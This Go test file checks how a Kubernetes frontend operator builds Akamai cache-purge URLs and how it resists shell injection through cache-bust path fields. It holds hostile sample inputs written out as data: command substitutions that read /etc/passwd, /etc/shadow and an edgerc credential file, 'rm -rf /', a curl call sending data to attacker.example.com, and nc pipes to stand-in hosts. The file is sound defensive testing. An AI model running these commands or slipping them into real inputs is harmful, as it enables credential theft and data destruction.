package controllers

import (
	"slices"
	"strings"
	"testing"

	crd "github.com/RedHatInsights/frontend-operator/api/v1alpha1"
	"github.com/go-logr/logr"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func TestCreateCachePurgePathList(t *testing.T) {
	log := logr.Discard()

	makeFrontend := func(paths []string) *crd.Frontend {
		return &crd.Frontend{
			ObjectMeta: metav1.ObjectMeta{Name: "inventory"},
			Spec: crd.FrontendSpec{
				AkamaiCacheBustPaths: paths,
			},
		}
	}

	makeEnv := func(urls []string) *crd.FrontendEnvironment {
		return &crd.FrontendEnvironment{
			Spec: crd.FrontendEnvironmentSpec{
				AkamaiCacheBustURLs: urls,
			},
		}
	}

	t.Run("normal paths are prepended with host", func(t *testing.T) {
		fe := makeFrontend([]string{"/apps/inventory/fed-mods.json"})
		env := makeEnv([]string{"https://console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 1 {
			t.Fatalf("expected 1 path, got %d", len(paths))
		}
		if paths[0] != "https://console.redhat.com/apps/inventory/fed-mods.json" {
			t.Errorf("unexpected path: %s", paths[0])
		}
	})

	t.Run("nil paths uses default fed-mods.json", func(t *testing.T) {
		fe := makeFrontend(nil)
		env := makeEnv([]string{"https://console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 1 {
			t.Fatalf("expected 1 path, got %d", len(paths))
		}
		if paths[0] != "https://console.redhat.com/apps/inventory/fed-mods.json" {
			t.Errorf("unexpected path: %s", paths[0])
		}
	})

	t.Run("full URL paths pass through unchanged", func(t *testing.T) {
		fe := makeFrontend([]string{"https://other.cdn.com/assets/main.js"})
		env := makeEnv([]string{"https://console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 1 {
			t.Fatalf("expected 1 path, got %d", len(paths))
		}
		if paths[0] != "https://other.cdn.com/assets/main.js" {
			t.Errorf("unexpected path: %s", paths[0])
		}
	})

	t.Run("duplicate paths are deduplicated", func(t *testing.T) {
		fe := makeFrontend([]string{"/apps/inventory/fed-mods.json", "/apps/inventory/fed-mods.json"})
		env := makeEnv([]string{"https://console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 1 {
			t.Fatalf("expected 1 deduplicated path, got %d: %v", len(paths), paths)
		}
	})

	t.Run("no cache bust URLs returns empty", func(t *testing.T) {
		fe := makeFrontend([]string{"/foo"})
		env := makeEnv(nil)
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 0 {
			t.Fatalf("expected 0 paths, got %d", len(paths))
		}
	})

	t.Run("paths with shell metacharacters are rejected", func(t *testing.T) {
		fe := makeFrontend([]string{
			"/valid/path.json",
			"$(cat /etc/passwd)",
			"; rm -rf /",
			"`whoami`",
			"| nc evil.com 4444",
			"/another/valid/path",
		})
		env := makeEnv([]string{"https://console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 2 {
			t.Fatalf("expected 2 valid paths, got %d: %v", len(paths), paths)
		}
		if paths[0] != "https://console.redhat.com/valid/path.json" {
			t.Errorf("unexpected first path: %s", paths[0])
		}
		if paths[1] != "https://console.redhat.com/another/valid/path" {
			t.Errorf("unexpected second path: %s", paths[1])
		}
	})

	t.Run("empty slice produces no paths", func(t *testing.T) {
		fe := makeFrontend([]string{})
		env := makeEnv([]string{"https://console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 0 {
			t.Fatalf("expected 0 paths for empty slice, got %d: %v", len(paths), paths)
		}
	})

	t.Run("all invalid paths produces no paths", func(t *testing.T) {
		fe := makeFrontend([]string{"$(whoami)", "`id`", "| cat /etc/shadow"})
		env := makeEnv([]string{"https://console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 0 {
			t.Fatalf("expected 0 paths when all are invalid, got %d: %v", len(paths), paths)
		}
	})

	t.Run("multiple cache bust URLs expand each valid path", func(t *testing.T) {
		fe := makeFrontend([]string{"/apps/inventory/fed-mods.json"})
		env := makeEnv([]string{"https://console.redhat.com", "https://us.console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 2 {
			t.Fatalf("expected 2 paths, got %d: %v", len(paths), paths)
		}
		if paths[0] != "https://console.redhat.com/apps/inventory/fed-mods.json" {
			t.Errorf("unexpected first path: %s", paths[0])
		}
		if paths[1] != "https://us.console.redhat.com/apps/inventory/fed-mods.json" {
			t.Errorf("unexpected second path: %s", paths[1])
		}
	})

	t.Run("path without leading slash gets one added", func(t *testing.T) {
		fe := makeFrontend([]string{"apps/inventory/fed-mods.json"})
		env := makeEnv([]string{"https://console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 1 {
			t.Fatalf("expected 1 path, got %d", len(paths))
		}
		if paths[0] != "https://console.redhat.com/apps/inventory/fed-mods.json" {
			t.Errorf("expected leading slash to be added, got: %s", paths[0])
		}
	})

	t.Run("mixed valid and invalid with multiple URLs", func(t *testing.T) {
		fe := makeFrontend([]string{
			"/config/chrome/fed-modules.json",
			"$(evil)",
			"/apps/chrome/index.html",
		})
		env := makeEnv([]string{"https://console.redhat.com", "https://us.console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		expected := []string{
			"https://console.redhat.com/config/chrome/fed-modules.json",
			"https://console.redhat.com/apps/chrome/index.html",
			"https://us.console.redhat.com/config/chrome/fed-modules.json",
			"https://us.console.redhat.com/apps/chrome/index.html",
		}
		if len(paths) != len(expected) {
			t.Fatalf("expected %d paths, got %d: %v", len(expected), len(paths), paths)
		}
		for i, exp := range expected {
			if paths[i] != exp {
				t.Errorf("path[%d]: expected %q, got %q", i, exp, paths[i])
			}
		}
	})

	t.Run("http URL paths pass through unchanged", func(t *testing.T) {
		fe := makeFrontend([]string{"http://cdn.example.com/assets/main.js"})
		env := makeEnv([]string{"https://console.redhat.com"})
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 1 {
			t.Fatalf("expected 1 path, got %d", len(paths))
		}
		if paths[0] != "http://cdn.example.com/assets/main.js" {
			t.Errorf("http URL should pass through unchanged, got: %s", paths[0])
		}
	})

	t.Run("deprecated AkamaiCacheBustURL is used when URLs slice is empty", func(t *testing.T) {
		fe := makeFrontend([]string{"/apps/inventory/fed-mods.json"})
		env := &crd.FrontendEnvironment{
			Spec: crd.FrontendEnvironmentSpec{
				AkamaiCacheBustURL: "https://console.redhat.com",
			},
		}
		paths := createCachePurgePathList(fe, env, log)

		if len(paths) != 1 {
			t.Fatalf("expected 1 path, got %d: %v", len(paths), paths)
		}
		if paths[0] != "https://console.redhat.com/apps/inventory/fed-mods.json" {
			t.Errorf("unexpected path: %s", paths[0])
		}
	})

	t.Run("deprecated AkamaiCacheBustURL is appended to URLs slice", func(t *testing.T) {
		fe := makeFrontend([]string{"/apps/inventory/fed-mods.json"})
		env := &crd.FrontendEnvironment{
			Spec: crd.FrontendEnvironmentSpec{
				AkamaiCacheBustURLs: []string{"https://console.redhat.com"},
				AkamaiCacheBustURL:  "https://us.console.redhat.com",
			},
		}
		paths := createCachePurgePathList(fe, env, log)

		expected := []string{
			"https://console.redhat.com/apps/inventory/fed-mods.json",
			"https://us.console.redhat.com/apps/inventory/fed-mods.json",
		}
		if len(paths) != len(expected) {
			t.Fatalf("expected %d paths, got %d: %v", len(expected), len(paths), paths)
		}
		for i, exp := range expected {
			if paths[i] != exp {
				t.Errorf("path[%d]: expected %q, got %q", i, exp, paths[i])
			}
		}
	})
}

// TestShellInjectionViaCacheBustPaths verifies that malicious
// akamaiCacheBustPaths values cannot reach the shell command string.
// Defense layer 1: IsValidCacheBustPath rejects paths with metacharacters.
// Defense layer 2: paths are passed via container Args ("$@"), not interpolated.
func TestShellInjectionViaCacheBustPaths(t *testing.T) {
	log := logr.Discard()
	env := &crd.FrontendEnvironment{
		Spec: crd.FrontendEnvironmentSpec{
			AkamaiCacheBustURLs: []string{"https://console.redhat.com"},
		},
	}

	injectionPayloads := []struct {
		name string
		path string
	}{
		{
			name: "command substitution with $()",
			path: "$(cat /opt/app-root/edgerc | base64)",
		},
		{
			name: "semicolon command chaining",
			path: "; curl http://attacker.example.com/exfil #",
		},
		{
			name: "backtick command substitution",
			path: "`whoami`",
		},
		{
			name: "pipe to external command",
			path: "| nc attacker.example.com 4444",
		},
	}

	for _, tc := range injectionPayloads {
		t.Run(tc.name, func(t *testing.T) {
			fe := &crd.Frontend{
				ObjectMeta: metav1.ObjectMeta{Name: "evil-frontend"},
				Spec: crd.FrontendSpec{
					AkamaiCacheBustPaths: []string{tc.path},
				},
			}

			paths := createCachePurgePathList(fe, env, log)

			if len(paths) != 0 {
				t.Errorf("injection payload should have been rejected by validation, got paths: %v", paths)
			}
		})
	}

	// Even if validation were bypassed, the production helper must not interpolate paths.
	t.Run("command helper does not interpolate paths", func(t *testing.T) {
		payload := "$(cat /opt/app-root/edgerc); rm -rf /"
		command, args := cacheBustContainerCommandArgs([]string{payload, "https://console.redhat.com/ok"})

		wantCommand := []string{"/bin/bash", "-c", cacheBustPurgeScript, "--"}
		if !slices.Equal(command, wantCommand) {
			t.Errorf("command: got %v, want %v", command, wantCommand)
		}
		if strings.Contains(strings.Join(command, " "), payload) {
			t.Errorf("injection payload must not appear in Command, got: %v", command)
		}
		if !strings.Contains(cacheBustPurgeScript, `"$@"`) {
			t.Error("cacheBustPurgeScript must use \"$@\" for safe argument passing")
		}
		if !slices.Equal(args, []string{payload, "https://console.redhat.com/ok"}) {
			t.Errorf("paths must be passed only via Args, got: %v", args)
		}
	})

	// Semicolon without spaces is URL-legal, so the allowlist accepts it.
	// It must still be passed only via Args so bash does not execute it.
	t.Run("URL-legal semicolon path is passed only via Args", func(t *testing.T) {
		fe := &crd.Frontend{
			ObjectMeta: metav1.ObjectMeta{Name: "inventory"},
			Spec: crd.FrontendSpec{
				AkamaiCacheBustPaths: []string{";whoami", "/apps/foo;jsessionid=1"},
			},
		}
		paths := createCachePurgePathList(fe, env, log)
		wantPaths := []string{
			"https://console.redhat.com/;whoami",
			"https://console.redhat.com/apps/foo;jsessionid=1",
		}
		if !slices.Equal(paths, wantPaths) {
			t.Fatalf("allowlist should accept URL-legal semicolons, got %v", paths)
		}

		command, args := cacheBustContainerCommandArgs(paths)
		wantCommand := []string{"/bin/bash", "-c", cacheBustPurgeScript, "--"}
		if !slices.Equal(command, wantCommand) {
			t.Errorf("command: got %v, want %v", command, wantCommand)
		}
		if !slices.Equal(args, wantPaths) {
			t.Errorf("paths must be passed only via Args, got: %v", args)
		}
		joinedCommand := strings.Join(command, " ")
		for _, path := range wantPaths {
			if strings.Contains(joinedCommand, path) {
				t.Errorf("path %q must not appear in Command, got: %v", path, command)
			}
		}
	})
}
